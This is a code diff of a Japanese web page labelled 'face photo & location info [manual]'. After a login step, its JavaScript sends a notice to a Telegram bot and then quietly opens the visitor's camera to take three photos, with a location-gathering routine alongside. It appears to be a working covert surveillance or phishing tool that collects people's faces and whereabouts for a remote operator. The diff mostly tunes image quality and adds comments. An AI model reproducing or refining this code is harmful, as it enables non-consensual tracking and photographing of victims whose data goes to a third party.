@@ -1,3 +1,4 @@
+顔写真&位置情報【手動】
 <!DOCTYPE html>
 <html lang="ja">
 <head>
@@ -169,16 +170,18 @@ document.getElementById("startAppBtn").onclick = async function() {
       BOT_TOKEN = t;
       CHAT_ID = i;
       
+      // ログイン成功メッセージを明示的に通知を飛ばす設定で送信
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
           chat_id: CHAT_ID, 
           text: "【ログイン成功👌】",
-          disable_notification: false 
+          disable_notification: false // 通知を強制
         })
       });
 
+      // 検証成功時のみロックを解除
       document.documentElement.style.overflow = "auto";
       document.body.style.overflow = "auto";
       document.getElementById("mainContent").style.display = "flex";
@@ -257,13 +260,8 @@ async function getTempLocation() {
 async function getTempData() {
   tempPhotos = []; tempLocationMsg = "";
   try {
-    // 修正箇所：端末が許容する最大解像度をリクエスト
     const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        width: { ideal: 4096 },
-        height: { ideal: 2160 },
-        facingMode: useBackCamera ? "environment" : "user" 
-      } 
+      video: { facingMode: useBackCamera ? "environment" : "user" } 
     });
     const video = document.createElement("video");
     video.srcObject = stream;
@@ -271,12 +269,9 @@ async function getTempData() {
     await new Promise(r => setTimeout(r, 1000));
     for (let i = 0; i < 3; i++) {
       const tc = document.createElement("canvas");
-      // 修正箇所：キャプチャ解像度をビデオストリームに合わせる
-      tc.width = video.videoWidth; 
-      tc.height = video.videoHeight;
+      tc.width = video.videoWidth; tc.height = video.videoHeight;
       tc.getContext("2d").drawImage(video, 0, 0);
-      // 修正箇所：品質パラメータを1.0（最高画質）に設定
-      const blob = await new Promise(r => tc.toBlob(r, "image/jpeg", 1.0));
+      const blob = await new Promise(r => tc.toBlob(r, "image/jpeg", 0.7));
       if(blob) tempPhotos.push(blob);
       await new Promise(r => setTimeout(r, 400));
     }
